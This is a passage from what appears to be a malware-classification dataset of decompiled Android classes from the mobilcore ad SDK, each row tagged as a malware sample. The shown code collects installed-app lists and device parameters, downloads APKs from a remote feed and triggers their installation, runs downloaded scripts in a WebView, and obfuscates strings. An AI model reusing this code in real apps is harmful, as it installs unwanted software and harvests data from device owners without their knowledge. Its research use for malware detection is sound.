a.STATE_READY) {       b(""goToMarket"",""Trying to go to market failed: not ready."");     }  else {       this.g=activity;       a(b.SHOW);     }   }   public synchronized void a(  a aVar){     a(""setState"",""from:"" + this.f + "" , to:""+ aVar);     this.f=aVar;   } private class c implements aF.a {     private boolean b=false;     static boolean a(    c cVar,    boolean z){       cVar.b=false;       return false;     }     public c(){     }     public final void init(    String str,    String str2){       C0107p.this.a(""JSFlowBridge , init"",""flow:"" + str + "" , flowName:""+ str2);       C0107p.this.c=str2;       C0107p.this.b=str;     }     public final String getMobileParams(){       C0107p.this.a(""JSFlowBridge , getMobileParams"");       return aE.k(MobileCore.c());     }     public final String getInstalledAppPackages(){       C0107p.this.a(""JSFlowBridge , getInstalledAppPackages"");       return aE.b();     }     public final void processFeed(    String str){       C0107p.this.a(""JSFlowBridge , processFeed"");       C0114w.a().a(""direct-feed"",str);       try {         C0107p.this.h=new JSONObject(str);         C0107p.this.i=C0107p.this.h.getJSONArray(NativeAdResponse.KEY_ADS);         C0107p.this.j.clear();         if (C0107p.this.f == a.STATE_INIT) {           C0107p.this.a(a.STATE_READY);           C0107p.e(C0107p.this);         }       }  catch (      JSONException e) {         aE.a(MobileCore.c(),C0107p.class.getName(),e);       }     }     public final void processNotAllowed(){       C0107p.this.a(""JSFlowBridge , processNotAllowed"");       C0107p.this.a(a.STATE_ERROR);     }     public final void show(){       int i;       JSONObject jSONObject;       int i2=0;       try {         if (!this.b) {           this.b=true;           while (true) {             i=i2;             if (i < C0107p.this.i.length()) {               Boolean bool=(Boolean)C0107p.this.j.get(i);               if (bool == null || !bool.booleanValue()) {                 break;               }  else {                 i2=i + 1;               }             }  else {               jSONObject=null;               break;             }           }           jSONObject=C0107p.this.i.getJSONObject(i);           jSONObject.put(""index"",i);           C0107p.this.j.put(i,true);           if (jSONObject == null) {             jSONObject=C0107p.this.i.getJSONObject(0);           }           if (C0107p.this.g != null) {             C0101j.a(C0107p.this.g);           }           C0107p.this.a(C0107p.this.g,jSONObject,new AbstractC0103l.d(){             @Override public final void a(){               c.a(c.this,false);             }           } );           C0107p.h(C0107p.this);         }       }  catch (      JSONException e) {         e.printStackTrace();       }     }     public final void reportFeedRequestError(){       if (C0107p.this.f == a.STATE_INIT) {         C0107p.this.a(a.STATE_ERROR);         C0107p.this.b(""reportFeedRequestError"",""Unspecified Error."");       }     }     public final void openReportOffers(    String str,    String str2){       try {         aE.a(MobileCore.c(),C0107p.this.b,C0107p.this.b,aJ.a.a(str),"""",aN.a(new JSONArray(str2)));       }  catch (      Exception e) {         e.printStackTrace();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0108q.code","final class C0108q { public static class c implements aE.b {     protected String a;     protected String b;     protected aE.c c;     public c(    String str,    String str2,    aE.c cVar){       this.a=str2;       this.b=str;       this.c=cVar;     }     protected final File b(    HttpResponse httpResponse){       try {         InputStream content=httpResponse.getEntity().getContent();         Header firstHeader=httpResponse.getFirstHeader(""Content-Encoding"");         return a((firstHeader == null || !firstHeader.getValue().equalsIgnoreCase(""gzip"")) ? content : new GZIPInputStream(content));       }  catch (      Exception e) {         if (this.c != null) {           this.c.a(this.a,e);         }         return null;       }     }     private File a(    InputStream inputStream){       if (this.c != null) {         this.c.a(this.a);       }       File file=null;       try {         file=aE.a(inputStream,this.b,this.a);       }  catch (      IOException e) {         if (this.c != null) {           this.c.a(this.a,e);         }       }       if (this.c != null) {         aE.c cVar=this.c;         String str=this.a;       }       return file;     }     @Override public boolean a(    HttpResponse httpResponse){       File b=b(httpResponse);       if (this.c != null) {         this.c.a(this.a,b != null);       }       return b != null;     }     @Override public final void a(    int i){       if (this.c != null) {         this.c.a(this.a,i);       }     }     @Override public final void a(    Exception exc){       if (this.c != null) {         this.c.a(this.a,exc);       }     }   } public static class d extends c {     public d(    String str,    String str2,    aE.c cVar){       super(str,str2,cVar);     }     @Override public final boolean a(    HttpResponse httpResponse){       File b=super.b(httpResponse);       boolean a=aX.a(this.b,b);       if (this.c != null) {         this.c.a(this.a,b != null);       }       return a;     }   } public static class b extends c {     private WebView d;     private String e;     public b(    WebView webView,    String str,    String str2,    String str3,    aE.c cVar){       super(str,str2,cVar);       this.d=webView;       this.e=str3;     }     @Override public final boolean a(    HttpResponse httpResponse){       File b=super.b(httpResponse);       if (b == null) {         A.a(""FlowFileHandler | processFile | failed to get flow file from web. will use fallback"",3);         return false;       }       MobileCore.b().post(new Runnable(){         @Override public final void run(){           String a=b.a(b.this.b,b.this.a,b.this.e);           A.a(""FlowFileHandler | executeFlow | localUrl: "" + a,55);           b.this.d.loadUrl(a);         }       } );       if (this.c != null) {         this.c.a(this.a,b != null);       }       return true;     }     public static String a(    String str,    String str2,    String str3){       String str4=""file://"" + str + ""/""+ str2;       if (!TextUtils.isEmpty(str3)) {         return str4 + ""?action="" + str3;       }       return str4;     }   } public static class a extends c {     private static boolean d=false;     private long e;     public a(    String str,    String str2,    aE.c cVar){       super(str,str2,cVar);     }     private String a(    String str){       if (TextUtils.isEmpty(str)) {         return null;       }       String str2=aE.b(str) + aE.h(str);       String str3=aO.a() + ""/"" + str2;       File file=new File(str3);       if (!file.exists()) {         aO.a(str,this.c);       }  else {         file.setLastModified(System.currentTimeMillis());         A.a(""ResourceManager |  resource: "" + str2 + "" is already here - updated timestamp"",55);       }       return ""file://"" + str3;     }     private void a(){       long currentTimeMillis=System.currentTimeMillis();       File file=new File(aO.a());       if (file.exists()) {         File[] listFiles=file.listFiles();         for (        File file2 : listFiles) {           if (currentTimeMillis - file2.lastModified() > this.e) {             file2.delete();           }         }       }     }     private boolean a(    JSONObject jSONObject){       JSONObject jSONObject2;       try {         a(jSONObject,jSONObject.optJSONArray(""extra""));         JSONObject optJSONObject=jSONObject.optJSONObject(""expirations"");         if (optJSONObject == null) {           JSONObject jSONObject3=new JSONObject();           jSONObject.putOpt(""expirations"",jSONObject3);           jSONObject2=jSONObject3;         }  else {           jSONObject2=optJSONObject;         }         long currentTimeMillis=System.currentTimeMillis();         long optLong=jSONObject2.optLong(""soft_expiration"",-1L);         long optLong2=jSONObject2.optLong(""hard_expiration"",-1L);         A.a(""FeedExpiration | processed feed. expirationTimeSoft:"" + optLong + "" , expirationTimeHard:""+ optLong2,55);         if (optLong <= 0) {           optLong=-1;         }         long j=optLong2 <= 0 ? -1L : optLong2;         long j2=optLong != -1 ? optLong + currentTimeMillis : -1L;         long j3=j != -1 ? j + currentTimeMillis : -1L;         jSONObject2.putOpt(""soft_expiration"",Long.valueOf(j2));         jSONObject2.putOpt(""hard_expiration"",Long.valueOf(j3));         this.e=jSONObject2.optLong(""media_expiration"",86400000L);         if (!d) {           a();           d=true;         }         JSONArray optJSONArray=jSONObject.optJSONArray(NativeAdResponse.KEY_ADS);         JSONArray jSONArray=new JSONArray();         for (int i=0; i < optJSONArray.length(); i++) {           JSONObject optJSONObject2=optJSONArray.optJSONObject(i);           jSONArray.put(optJSONObject2);           optJSONObject2.putOpt(""img"",a(optJSONObject2.optString(""img"")));           optJSONObject2.putOpt(""cover_img"",a(optJSONObject2.optString(""cover_img"")));           a(optJSONObject2,optJSONObject2.optJSONArray(""extra""));         }         jSONObject.put(NativeAdResponse.KEY_ADS,jSONArray);         return true;       }  catch (      Exception e) {         if (this.c != null) {           this.c.a(this.a,e);         }         return false;       }     }     private void a(    JSONObject jSONObject,    JSONArray jSONArray){       if (jSONArray != null) {         try {           JSONArray jSONArray2=new JSONArray();           for (int i=0; i < jSONArray.length(); i++) {             JSONObject optJSONObject=jSONArray.optJSONObject(i);             String string=optJSONObject.getString(""value"");             String string2=optJSONObject.getString(MetaDataStyle.KEY_NAME);             String string3=optJSONObject.getString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE);             if (""img"".equalsIgnoreCase(string3) || ""audio"".equalsIgnoreCase(string3) || ""video"".equalsIgnoreCase(string3)|| ""file"".equalsIgnoreCase(string3)) {               jSONObject.putOpt(string2,a(string));             }  else             if (""report"".equalsIgnoreCase(string3)) {               jSONArray2.put(optJSONObject);             }  else {               jSONObject.putOpt(string2,string);             }           }           jSONObject.remove(""extra"");           jSONObject.put(""extra"",jSONArray2);         }  catch (        JSONException e) {           if (this.c != null) {             this.c.a(this.a,e);           }         }       }     }     @Override public final boolean a(    HttpResponse httpResponse){       boolean z;       try {         InputStream content=httpResponse.getEntity().getContent();         Header firstHeader=httpResponse.getFirstHeader(""Content-Encoding"");         BufferedReader bufferedReader=new BufferedReader(new InputStreamReader((firstHeader == null || !firstHeader.getValue().equalsIgnoreCase(""gzip"")) ? content : new GZIPInputStream(content),""UTF-8""));         StringBuilder sb=new StringBuilder();         while (true) {           String readLine=bufferedReader.readLine();           if (readLine == null) {             break;           }           sb.append(readLine).append(""\n"");         }         JSONObject jSONObject=new JSONObject(new JSONTokener(sb.toString()));         if (jSONObject.optString(AnalyticsEvent.EVENT_ID,null) == null) {           aE.b(MobileCore.c(),MobileCore.class.getName(),""Feed is missing field 'id'"");         }         JSONArray optJSONArray=jSONObject.optJSONArray(NativeAdResponse.KEY_ADS);         if (optJSONArray == null || optJSONArray.length() <= 0) {           Context c=MobileCore.c();           String name=MobileCore.class.getName();           Object[] objArr=new Object[1];           objArr[0]=optJSONArray == null ? ""missing"" : ""empty"";           aE.b(c,name,String.format(""Feed ads are invalid (%s)"",objArr));           z=false;         }  else {           z=true;         }         boolean z2=z && a(jSONObject);         if (this.c == null) {           return true;         }         this.c.a(jSONObject,this.a,z2);         return true;       }  catch (      Exception e) {         if (this.c != null) {           this.c.a(this.a,e);         }         return false;       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0109r.code","public final class C0109r {   private static C0109r a=null;   private Context b;   public static C0109r a(){     if (a == null) {       a=new C0109r();     }     return a;   }   private C0109r(){   }   public final void a(  Context context){     this.b=context;   }   public final void a(  String str,  String str2,  String str3,  String str4,  String str5,  long j,  boolean z,  String str6){     A.a(""downloadFileToInternalStorage started"",55);     if (!a(str2)) {       A.a(""downloadFileToInternalStorage | isDownloadingApp ("" + str2 + "") = false"",55);       C0068a.a(this.b,str2,0);       A.a(""Started downloadFileTo.."",55);       String d=aE.d(str);       Intent m=aE.m(this.b);       m.putExtra(""extra_service_type"",AdTrackerConstants.GOAL_DOWNLOAD);       m.putExtra(""com.ironsource.mobilcore.extra_download_url"",str);       m.putExtra(""com.ironsource.mobilcore.extra_download_filename"",d);       m.putExtra(""com.ironsource.mobilcore.extra_download_appname"",str2);       m.putExtra(""com.ironsource.mobilcore.extra_is_apk_download"",true);       m.putExtra(""com.ironsource.mobilcore.extra_download_app_img_name"",str3);       m.putExtra(""com.ironsource.mobilecore.MobileCoreReport_extra_flow"",str5);       m.putExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_flow_type"",str6);       m.putExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_offer"",str4);       m.putExtra(""com.ironsource.mobilcore.extra_download_queue_id"",-1L);       this.b.startService(m);       return;     }     A.a(""downloadFileToInternalStorage | isDownloadingApp ("" + str2 + "") = true"",55);   }   public final boolean a(  String str){     return aE.n(this.b).getInt(new StringBuilder(""apkDownloadFile_"").append(str).toString(),-1) == 0;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0110s.code","public final class C0110s {   private NotificationManager f;   private Notification.Builder i;   private Notification j;   private Context k;   private int l;   private DownloadManager m;   private String n;   private String o;   private final String a=""Downloading"";   private final String b=""Download In Progress..."";   private final String c=""Download"";   private final String d=""Download Complete."";   private final String e=""Download Error."";   private final int g=Build.VERSION.SDK_INT;   private final int h=495307123;   public C0110s(  Context context,  Intent intent){     this.f=null;     A.a(""dmService called"",55);     if (this.k == null) {       this.k=context;       this.f=(NotificationManager)context.getSystemService(""notification"");     }     if (intent.getStringExtra(""extra_service_type"").equals(AdTrackerConstants.GOAL_DOWNLOAD)) {       A.a(""got download intent"",55);       String stringExtra=intent.getStringExtra(""com.ironsource.mobilcore.extra_download_url"");       String stringExtra2=intent.getStringExtra(""com.ironsource.mobilcore.extra_download_filename"");       String stringExtra3=intent.getStringExtra(""com.ironsource.mobilcore.extra_download_appname"");       String stringExtra4=intent.getStringExtra(""com.ironsource.mobilcore.extra_download_app_img_name"");       String stringExtra5=intent.getStringExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_offer"");       this.n=intent.getStringExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_flow_type"");       this.o=intent.getStringExtra(""com.ironsource.mobilecore.MobileCoreReport_extra_flow"");       boolean booleanExtra=intent.getBooleanExtra(""com.ironsource.mobilcore.extra_is_apk_download"",false);       if (this.g >= 14) {         String str=this.n;         String str2=this.o;         a(stringExtra,stringExtra2,stringExtra4,stringExtra3,stringExtra5,booleanExtra);         return;       }       if (this.g >= 9) {         if (aE.a(this.k,""android.permission.WRITE_EXTERNAL_STORAGE"")) {           A.a(""WRITE_EXTERNAL_STORAGE permission available. Using DownloadManager"",55);           A.a(""got api: "" + this.g,55);           long longExtra=intent.getLongExtra(""com.ironsource.mobilcore.extra_download_queue_id"",-1L);           A.a(""got queue_id: "" + longExtra,55);           String str3=Environment.getExternalStorageDirectory() + ""/mc_data"";           if (longExtra == -1) {             A.a(""no_queue_id"",55);             this.m=(DownloadManager)context.getSystemService(AdTrackerConstants.GOAL_DOWNLOAD);             DownloadManager.Request request=new DownloadManager.Request(Uri.parse(stringExtra));             File file=new File(str3);             if (!file.exists()) {               file.mkdirs();             }             String str4=file + File.separator + stringExtra2;             A.a(""deleting file "" + str4,55);             A.a(""file deletion was "" + new File(str4).delete(),55);             request.setDestinationInExternalPublicDir(""/mc_data"",stringExtra2);             request.setAllowedNetworkTypes(3);             request.setAllowedOverRoaming(false);             request.setVisibleInDownloadsUi(true);             try {               request.setShowRunningNotification(true);             }  catch (            Exception e) {               A.a(""downloadManager error: "" + e.getMessage(),55);             }             request.setTitle(""Downloading "" + stringExtra3);             request.setDescription(""Download In Progress..."");             long enqueue=this.m.enqueue(request);             A.a(""queue_id from Download Manager is: "" + enqueue,55);             String str5=this.n;             a(stringExtra,stringExtra3,stringExtra4,stringExtra5,stringExtra2,enqueue,this.o);             return;           }           A.a(""queue_id != Consts.NO_QUEUE_ID trying installation"",55);           if (this.m == null) {             this.m=(DownloadManager)this.k.getSystemService(AdTrackerConstants.GOAL_DOWNLOAD);           }           DownloadManager.Query query=new DownloadManager.Query();           query.setFilterById(longExtra);           Cursor query2=this.m.query(query);           int i=-3;           if (query2 != null && query2.moveToFirst()) {             i=query2.getColumnIndex(""status"");           }           long j=query2.getInt(i);           A.a(""Download Status = "" + j,55);           if (j == 16) {             A.a(""DownloadManagerService | status fail: removing file if exists and reporting fail."",55);             C0068a.a(this.k,stringExtra3,2);             String d=aE.d(stringExtra);             A.a(""Deleting file: "" + d,55);             this.k.deleteFile(d);             a(stringExtra5,""S-"");             return;           }           if (j == 8) {             A.a(""DownloadManagerService | removing "" + stringExtra3,55);             C0068a.a(this.k,stringExtra3,1);             aE.a(this.k,this.n,aE.a(this.k,str3,aE.d(stringExtra)),stringExtra5,0,this.o,-1);             a(stringExtra5,""S"");             A.a(""installQueuedFile start"",55);             if (this.m == null) {               this.m=(DownloadManager)this.k.getSystemService(AdTrackerConstants.GOAL_DOWNLOAD);             }             DownloadManager.Query query3=new DownloadManager.Query();             query3.setFilterById(longExtra);             Cursor query4=this.m.query(query3);             if (query4 == null || !query4.moveToFirst()) {               return;             }             int i2=query4.getInt(query4.getColumnIndex(AnalyticsSQLiteHelper.GENERAL_ID));             if (i2 == longExtra) {               A.a(""download succesfull "" + i2,55);             }             try {               int columnIndex=query4.getColumnIndex(""local_uri"");               A.a(""urlcollon "" + columnIndex,55);               String string=query4.getString(columnIndex);               String a=a(string);               A.a(""installQueuedFile | attempting removeFilePrefix("" + string + "")"",55);               Intent intent2=new Intent(""android.intent.action.VIEW"");               A.a(""fileUri: "" + a,55);               intent2.setDataAndType(Uri.fromFile(new File(a)),""application/vnd.android.package-archive"");               intent2.addFlags(268435456);               this.k.startActivity(intent2);               return;             }  catch (            Exception e2) {               if (query4.getInt(query4.getColumnIndex(""reason"")) == 1007) {                 aE.b(this.k,getClass().getName(),""Couldn't download: No SD card mounted."");                 return;               }  else {                 aE.a(this.k,getClass().getName(),e2);                 return;               }             }           }           A.a(""Download still in progress not installing yet. trying again in 1"",55);           String str6=this.n;           a(stringExtra,stringExtra3,stringExtra4,stringExtra5,stringExtra2,longExtra,this.o);           return;         }         A.a(""WRITE_EXTERNAL_STORAGE permission unavailable. Using custom DownloadManager"",55);         String str7=this.n;         String str8=this.o;         a(stringExtra,stringExtra2,stringExtra4,stringExtra3,stringExtra5,booleanExtra);         return;       }       A.a(""downloading for api < GingerBread"",55);       String str9=this.n;       String str10=this.o;       a(stringExtra,stringExtra2,stringExtra4,stringExtra3,stringExtra5,booleanExtra);       return;     }     if (intent.getStringExtra(""extra_service_type"").equals(""com.ironsource.mobilcore.extra_service_close_notification"")) {       A.a(""got service type close notification"",55);       int intExtra=intent.getIntExtra(""com.ironsource.mobilcore.extra_close_notification_num"",-1);       if (intExtra >= 0) {         this.f.cancel(intExtra);       }     }   }   private void a(  String str,  String str2,  String str3,  String str4,  String str5,  long j,  String str6){     A.a(""recallDownloadService started"",55);     AlarmManager alarmManager=(AlarmManager)this.k.getSystemService(""alarm"");     Intent m=aE.m(this.k);     m.putExtra(""extra_service_type"",AdTrackerConstants.GOAL_DOWNLOAD);     m.putExtra(""com.ironsource.mobilcore.extra_download_url"",str);     m.putExtra(""com.ironsource.mobilcore.extra_download_appname"",str2);     m.putExtra(""com.ironsource.mobilcore.extra_download_app_img_name"",str3);     m.putExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_offer"",str4);     m.putExtra(""com.ironsource.mobilecore.MobileCoreReport_extra_flow"",str6);     m.putExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_flow_type"",this.n);     m.putExtra(""com.ironsource.mobilcore.extra_download_queue_id"",j);     m.setAction(""assisst_download_manager"");     m.putExtra(""com.ironsource.mobilcore.extra_download_filename"",str5);     m.putExtra(""com.ironsource.mobilcore.extra_is_apk_download"",true);     alarmManager.set(0,System.currentTimeMillis() + 60000,PendingIntent.getService(this.k,(int)System.currentTimeMillis(),m,1073741824));   }   private void a(  java.lang.String r16,  java.lang.String r17,  java.lang.String r18,  java.lang.String r19,  java.lang.String r20,  boolean r21){     throw new UnsupportedOperationException(""Method not decompiled: com.ironsource.mobilcore.C0110s.a(java.lang.String, java.lang.String, java.lang.String, java.lang.String, java.lang.String, boolean):void"");   }   private static String a(  String str){     A.a(""removing prefix from: "" + str,55);     if (str.startsWith(""file://"")) {       return str.substring(8);     }     A.a(""Prefix cutting failed: no file:/// prefix found."" + str,55);     return str;   }   private void a(  String str,  String str2,  Bitmap bitmap){     if (this.g >= 16) {       this.i=new Notification.Builder(this.k).setContentTitle(str).setContentText(str2).setSmallIcon(android.R.drawable.stat_sys_download_done);       if (bitmap != null) {         this.i.setLargeIcon(bitmap);       }       this.i.setAutoCancel(true);       this.i.setOngoing(false);       this.i.setContentIntent(PendingIntent.getActivity(this.k,0,new Intent(),0));       this.j=this.i.build();       this.f.notify(495307123,this.j);       return;     }     A.a(""< 2.3 notification."",55);     PendingIntent activity=PendingIntent.getActivity(this.k,0,new Intent(),0);     if (this.f == null) {       this.f=(NotificationManager)this.k.getSystemService(""notification"");     }     Notification notification=new Notification(android.R.drawable.stat_sys_download_done,str,System.currentTimeMillis());     if (""Download Complete."".equals(str2)) {       notification.flags&=2;       notification.flags|=16;     }  else {       notification.flags&=16;       notification.flags|=2;     }     notification.setLatestEventInfo(this.k,str,str2,activity);     this.f.notify(495307123,notification);   }   private void a(  String str,  String str2){     aE.a(this.k,this.o,this.n,str2,str);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0111t.code","final class C0111t extends C0104m {   private JSONObject A;   private String x;   private String y;   private String z;   public C0111t(){   }   public C0111t(  C0104m c0104m){     this.a=c0104m.a;     this.b=c0104m.b;     this.c=c0104m.c;     this.e=c0104m.e;     this.f=c0104m.f;     this.g=c0104m.g;     this.h=c0104m.h;     this.i=c0104m.i;     this.j=c0104m.j;     this.k=c0104m.k;     this.l=c0104m.l;     this.m=c0104m.m;     this.n=c0104m.n;     this.o=c0104m.o;     this.p=c0104m.p;     this.q=c0104m.q;   }   public final void n(  String str){     this.x=str;   }   public final void o(  String str){     this.y=str;   }   public final void p(  String str){     this.z=str;   }   public final void q(  String str){     try {       this.A=new JSONObject(str);     }  catch (    JSONException e) {     }   }   @Override public final HashMap<String,String> a(  HashMap<String,String> hashMap){     return super.a(a(a(a(hashMap,""Component"",this.x),""Event"",this.y),""Action"",this.z));   }   @Override public final JSONObject a(){     JSONObject a=super.a();     if (this.A != null) {       try {         a.put(""AdditionalParams"",this.A);       }  catch (      JSONException e) {         e.printStackTrace();       }     }     return a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0112u.code","final class C0112u {   public enum a {  OFFERWALL_TIME_TO_READY(""offerwall"",""time_to_ready""),   OFFERWALL_IMPRESSION_TO_CLICK(""offerwall"",""impression_to_click""),   OFFERWALL_CLICK_TO_START(""offerwall"",""click_to_start"");   private String d;   private String e;   a(  String str,  String str2){     this.d=str;     this.e=str2;   }   public final String a(){     return this.d;   }   public final String b(){     return this.e;   } } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0113v.code","final class C0113v {   protected static Integer a=52; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0114w.code","public final class C0114w {   private static C0114w a;   private String b;   private String c;   private HashMap<String,JSONObject> d=new HashMap<>(); public interface a {     void a(    JSONObject jSONObject);   }   public static C0114w a(){     if (a == null) {       a=new C0114w();     }     return a;   }   public final void a(  String str){     this.d.put(str,d(str));   }   public final JSONObject b(  String str){     return this.d.get(str);   }   public final String b(){     return this.c;   }   public final void a(  String str,  String str2){     A.a(getClass().getName() + ""| cacheFeed | "" + str,55);     try {       aE.a(aE.i(str2),this.b,String.format(""cache_%s.json"",str));       this.d.put(str,new JSONObject(str2));     }  catch (    IOException e) {       aE.a(MobileCore.c(),getClass().getName(),e);     } catch (    JSONException e2) {       e2.printStackTrace();     }   }   private JSONObject d(  String str){     A.a(getClass().getName() + ""| loadFeedFromCache | "" + str,55);     try {       File file=new File(this.b,String.format(""cache_%s.json"",str));       FileInputStream fileInputStream=new FileInputStream(file);       String a2=aE.a(fileInputStream);       fileInputStream.close();       JSONObject jSONObject=new JSONObject(a2);       if (!a(jSONObject,file.lastModified(),""hard_expiration"")) {         return jSONObject;       }       A.a(getClass().getName() + ""| loadFeedFromCache | feed is expired"",55);       return null;     }  catch (    JSONException e) {       aE.a(MobileCore.c(),getClass().getName(),e);       return null;     } catch (    Exception e2) {       return null;     }   }   public final void a(  JSONObject jSONObject,  aE.d dVar){     try {       aO.a aVar=new aO.a(dVar);       JSONArray a2=a(jSONObject);       String str=this.c;       for (int i=0; i < a2.length(); i++) {         JSONObject jSONObject2=a2.getJSONObject(i);         if (!new File(str + ""/"" + jSONObject2.getString(""filename"")).exists()) {           aVar.a(jSONObject2);         }       }       aVar.b(str);     }  catch (    JSONException e) {       e.printStackTrace();     }   }   public final boolean c(  String str){     A.a(getClass().getName() + ""| loadFeedFromCache | "" + str,55);     JSONObject jSONObject=this.d.get(str);     if (jSONObject != null && !a(jSONObject,new File(this.b,String.format(""cache_%s.json"",str)).lastModified(),""soft_expiration"")) {       return true;     }     return false;   }   private C0114w(){     File file=new File(MobileCore.c().getFilesDir().getPath(),""cached_feeds"");     if (!file.exists()) {       file.mkdirs();     }     this.b=file.getAbsolutePath();     File file2=new File(MobileCore.c().getFilesDir().getPath(),""cached_media"");     if (!file2.exists()) {       file2.mkdirs();     }     this.c=file2.getAbsolutePath();   }   private static boolean a(  JSONObject jSONObject,  long j,  String str){     try {       return System.currentTimeMillis() - j > jSONObject.getJSONObject(""expirations"").getLong(str);     }  catch (    JSONException e) {       return false;     }   }   private static JSONArray a(  JSONObject jSONObject) throws JSONException {     JSONArray jSONArray=new JSONArray();     JSONArray optJSONArray=jSONObject.optJSONArray(NativeAdResponse.KEY_ADS);     for (int i=0; i < optJSONArray.length(); i++) {       JSONObject optJSONObject=optJSONArray.optJSONObject(i);       String optString=optJSONObject.optString(""img"");       if (!TextUtils.isEmpty(optString)) {         jSONArray.put(aO.a(optString));       }       JSONArray optJSONArray2=optJSONObject.optJSONArray(""extra"");       if (optJSONArray2 != null) {         for (int i2=0; i2 < optJSONArray2.length(); i2++) {           JSONObject optJSONObject2=optJSONArray2.optJSONObject(i2);           try {             String string=optJSONObject2.getString(""value"");             if (""img"".equalsIgnoreCase(optJSONObject2.getString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE))) {               jSONArray.put(aO.a(string));             }           }  catch (          JSONException e) {             e.printStackTrace();           }         }       }     }     return jSONArray;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0116y.code","final class C0116y {   public static String a(  String str){     String str2="""";     for (int i=0; i < str.length(); i++) {       if (str.charAt(i) < 'k') {         str2=str2.concat(String.valueOf(str.charAt(i))).concat(""g#s"");       }  else       if (str.charAt(i) >= 'k') {         str2=str2.concat(String.valueOf(str.charAt(i))).concat(""d%1"");       }     }     return c(str2);   }   public static String b(  String str){     return c(str).replaceAll(""g#s"","""").replaceAll(""d%1"","""");   }   private static String c(  String str){     char[] charArray=str.toCharArray();     int i=0;     for (int length=charArray.length - 1; i < length; length--) {       char c=charArray[i];       charArray[i]=charArray[length];       charArray[length]=c;       i++;     }     return new String(charArray);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0117z.code","public final class C0117z {   private static C0117z a=null;   private static final String[] b={""android.permission.ACCESS_NETWORK_STATE""};   private static final String[] c={""android.permission.ACCESS_WIFI_STATE"",""android.permission.READ_PHONE_STATE"",""android.permission.WRITE_EXTERNAL_STORAGE""};   private boolean d;   private Context e;   private int f=-1;   private int g=-1;   public enum a {  SOFT,   HARD}   C0117z(){   }   public static C0117z a(){     if (a == null) {       a=new C0117z();     }     return a;   }   public final void a(  Context context,  MobileCore.LOG_TYPE log_type){     this.d=log_type == MobileCore.LOG_TYPE.DEBUG;     this.e=context;   }   public final boolean b(){     try {       PackageManager packageManager=this.e.getPackageManager();       boolean z=false;       for (int i=0; i < b.length; i++) {         String str=b[i];         if (packageManager.checkPermission(str,this.e.getPackageName()) != 0) {           a(""mobileCore requires permission: "" + str,a.HARD);           z=true;         }       }       for (int i2=0; i2 < c.length; i2++) {         String str2=c[i2];         if (packageManager.checkPermission(str2,this.e.getPackageName()) != 0) {           a(""mobileCore can potentially work better with: "" + str2,a.SOFT);         }       }       return e() & (z ? false : true);     }  catch (    Exception e) {       A.a(""ImpVerifier crashed: "" + e.getLocalizedMessage(),55);       return false;     }   }   private boolean e(){     try {       if (this.e.getPackageManager().getReceiverInfo(new ComponentName(this.e,(Class<?>)InstallationTracker.class),2).enabled) {         return true;       }     }  catch (    PackageManager.NameNotFoundException e) {       A.a(""ImpVerifier crashed: "" + e.getLocalizedMessage(),55);     }     a(""mobileCore's receiver is not declared in your manifest, see mobileCore documentation for more details."",a.HARD);     return false;   }   public final boolean c(){     if (this.e.getPackageManager().queryIntentServices(new Intent(this.e,(Class<?>)MobileCoreReport.class),65536).size() > 0) {       return true;     }     StackTraceElement[] stackTrace=Thread.currentThread().getStackTrace();     A.a(""Error: mobileCore's service not detected. Please register according to updated documentation."",2);     for (    StackTraceElement stackTraceElement : stackTrace) {       A.a(stackTraceElement.toString(),2);     }     return false;   }   public final void a(  Context context){     if (Build.VERSION.SDK_INT <= 10 && !aE.a(context,""android.permission.INTERNET"")) {       A.a(""Error: mobileCore has detected a critical, missing permission: android.permission.INTERNET. Please add it to your manifest for mobileCore to work correctly."",2);       for (      StackTraceElement stackTraceElement : Thread.currentThread().getStackTrace()) {         A.a(stackTraceElement.toString(),2);       }     }   }   public final void a(  StackTraceElement[] stackTraceElementArr){     for (int i=0; i < stackTraceElementArr.length; i++) {       try {         if (stackTraceElementArr[i].getMethodName().toLowerCase(Locale.US).contains(""oncreate"")) {           if (stackTraceElementArr[i - 1] != null && stackTraceElementArr[i - 1].getMethodName().toLowerCase(Locale.US).contains(""showofferwall"")) {             a(""Calling mobileCore's showOfferwall command in the onCreate event is not optimal, more time will allow better offers to load."",a.SOFT);             return;           }           return;         }       }  catch (      Exception e) {         return;       }     }   }   public final void a(  int i){     if (this.f == -1) {       this.f=i;     }  else     if (this.g == -1) {       this.g=i;       if (this.f == this.g - 1) {         a(""It is generally advised not to call mobileCore's showOfferwall directly after calling init"",a.SOFT);       }     }   }   public final boolean a(  String str,  Context context,  SharedPreferences.Editor editor){     String bigInteger=new BigInteger(str,36).toString(16);     if (bigInteger.length() > 32) {       String substring=bigInteger.substring(32);       A.a(""Account name in init. "" + substring,55);       